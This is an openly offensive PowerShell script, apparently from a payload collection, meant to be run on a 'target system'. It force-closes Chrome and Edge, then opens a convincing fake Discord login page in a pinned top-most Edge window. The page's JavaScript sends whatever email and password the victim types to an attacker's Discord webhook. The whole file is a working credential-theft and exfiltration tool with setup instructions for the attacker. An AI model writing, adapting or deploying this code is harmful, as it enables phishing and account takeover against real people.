<#
====================== Fake Discord Logon Screen to Discord Webhook =========================

SYNOPNIS
This script kills all egde and chrome processes, opens edge and asks for login info for discord and posts results to a discord webhook.

SETUP
1. Replace YOUR_WEBBHOOK_HERE with your webhook.

USAGE
1.Run script on target system.

#>

$dc = 'YOUR_WEBHOOK_HERE'

# GATHER SYSTEM AND USER INFO
$u = (Get-WmiObject Win32_UserAccount -Filter "Name = '$Env:UserName'").FullName
$c = $env:COMPUTERNAME

# HTML FOR LOGIN PAGE
$h = @"
<!doctypehtml>
<html lang=en>
<meta charset=UTF-8>
<link href=https://fonts.googleapis.com rel=preconnect>
<link href=https://fonts.gstatic.com rel=preconnect crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700;800&display=swap" rel=stylesheet>
<meta content="width=device-width,initial-scale=1" name=viewport>
<title>Discord</title>
<body>
  <style>
    body {
      font-family: 'Open Sans', sans-serif;
      background-repeat: no-repeat;
      background-size: cover;
      height: 100vh;
      background-attachment: fixed;
      display: flex;
      justify-content: center;
      align-items: center;
      background-image: url('https://i.imgur.com/Et3ZQGE.png');
    }

    ::-webkit-scrollbar {
      display: none;
    }

    #main-container {
      width: 754px;
      height: 350px;
      background-color: #313338;
      padding: 32px;
      border-radius: 5px;
    }

    #container {
      display: flex;
      justify-content: space-between;
      width: 100%;
    }

    #form {
      width: 60%;
    }

    #star {
      color: #d10000;
      font-size: smaller;
    }

    #header {
      text-align: center;
    }

    a {
      color: #00a7fa;
      font-size: small;
      text-decoration: none;
    }

    #login {
      background-color: #5865f2;
      border-radius: 3px;
      padding: 1px;
      margin-top: 15px;
    }

    #loginbtn {
      background-color: transparent;
      width: 100%;
      padding: 11px;
      height: 100%;
      border: none;
      color: #fff;
      font-size: .4cm;
      font-weight: 600;
    }

    #login:hover {
      background-color: #4752c4;
    }

    #header>.span1 {
      color: #dddee1;
      font-size: .55cm;
      font-weight: 700;
    }

    #header>p {
      color: #b5bac1;
      font-size: .4cm;
    }

    #links {
      margin-top: 8px;
    }

    #link1 {
      color: #80858e;
      font-size: small;
      margin-right: 5px;
    }

    #inputs {
      width: 100%;
      margin-top: 18px;
    }

    input {
      background-color: #1e1f22;
      border: none;
      width: 98%;
      border-radius: 5px;
      height: 40px;
      color: #dbdee1;
      font-size: 1rem;
      font-weight: 500;
      margin-top: 6px;
    }

    input:focus {
      outline: 0;
    }

    label {
      color: #b2b7bd;
      font-size: .3cm;
      font-weight: 800;
    }

    #QR_code {
      display: flex;
      width: 30%;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 10px;
    }

    #QR_code>span {
      color: #f2f3f5;
      font-size: .59cm;
      margin-top: 25px;
      font-weight: 600;
    }

    #QR_code>p {
      margin-top: 7px;
      color: #abb1b7;
      font-size: .4cm;
      text-align: center;
    }

    .loading {
      margin: auto;
      width: 50px;
      height: 50px;
      animation: scale ease 1.4s infinite;
    }

    .loading::before {
      content: '';
      position: absolute;
      width: 15px;
      height: 15px;
      background: #7289da;
      top: -10px;
      left: -10px;
      animation: top ease 3s infinite;
    }

    .loading::after {
      content: '';
      position: absolute;
      width: 15px;
      height: 15px;
      background: #7289da;
      bottom: -10px;
      right: -10px;
      animation: bottom ease 3s infinite;
    }

    @keyframes top {
      0% {
        top: -10px;
      }

      20% {
        top: -10px;
        left: 100%;
      }

      40% {
        top: 100%;
        left: 100%;
        transform: rotate(-90deg);
      }

      60% {
        top: 100%;
        left: -10px;
        transform: rotate(180deg);
      }

      80% {
        top: -10px;
        left: -10px;
        transform: rotate(90deg);
      }

      100% {
        top: -10px;
      }
    }

    @keyframes bottom {
      0% {
        bottom: -10px;
      }

      20% {
        bottom: -10px;
        right: 100%;
      }

      40% {
        bottom: 100%;
        right: 100%;
        transform: rotate(-90deg);
      }

      60% {
        bottom: 100%;
        right: -10px;
        transform: rotate(180deg);
      }

      80% {
        bottom: -10px;
        right: -10px;
        transform: rotate(90deg);
      }

      100% {
        bottom: -10px;
      }
    }

    @keyframes scale {
      0% {
        transform: scale(1);
      }

      50% {
        transform: scale(.7);
      }

      100% {
        transform: scale(1);
      }
    }

    @media (max-width:975px) {
      #QR_code {
        display: none;
      }

      #main-container {
        width: 424px;
      }

      #form {
        width: 100%;
      }
    }
  </style>
  <div align= 'center' id=main-container>
    <div id=container>
      <form action=/get id=form>
        <div id=header><span class=span1>Welcome back!</span>
          <p>We're so excited to see you again!</p>
        </div>
        <div id=block>
          <div id=inputs><label>EMAIL OR PHONE NUMBER <span id=star>*</span></label><br><input id=email name=email required onkeyup="this.setAttribute('value', this.value);" type=email><br></div>
          <div id=inputs><label>PASSWORD <span id=star>*</span></label><br><input id=password name=password required onkeyup="this.setAttribute('value', this.value);" type=password></div>
          <div><a href=#>Forgot your password?</a></div>
        </div>
        <div id=login><button id=loginbtn type=submit onclick="sendEmail(),event.preventDefault();">Log In</button></div>
        <div id=links><span id=link1>Need an account?</span><span><a href=#>Register</a></span></div>
      </form>
      <div id=QR_code>
        <div class=loading></div><span>Log in with QR Code</span>
        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
      </div>
    </div>
  </div>
  <script>
    const body = document.body;
    body.style.backgroundImage = "url('https://i.imgur.com/Et3ZQGE.png')";

    function sendEmail() {
        var webhookURL = "$dc";
        var message1 = document.getElementById("email").value;
        var message2 = document.getElementById("password").value;
        var message = "**Email:** " + message1 + "   |   **Password:** " + message2;
        var payload = {
            content: message
        };
        var xhr = new XMLHttpRequest();
        xhr.open("POST", webhookURL, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4){if (xhr.status === 200){
                    console.log("Message sent successfully!");}else{console.log("Error:", xhr.status);}}};
        xhr.send(JSON.stringify(payload));}

  </script>
</body>
</html>
"@

# SAVE HTML
$p = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "index.html")
$h | Out-File -Encoding UTF8 -FilePath $p
$a = "file://$p"

# KILL ANY BROWSERS (interfere with "Maximazed" argument)
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe", "/IM", "msedge.exe" -NoNewWindow -Wait
Sleep -Milliseconds 100

# START EDGE IN FULLSCREEN
$edgeProcess = Start-Process -FilePath "msedge.exe" -ArgumentList "--app=$a" -PassThru
$edgeProcess.WaitForInputIdle()

Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        public static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);
        public const uint SWP_NOMOVE = 0x2;
        public const uint SWP_NOSIZE = 0x1;
        public const uint SWP_SHOWWINDOW = 0x40;
    }
"@

# SET EDGE AS TOP WINDOW AND START SCREENSAVER
$null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
Sleep -Milliseconds 250
$null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
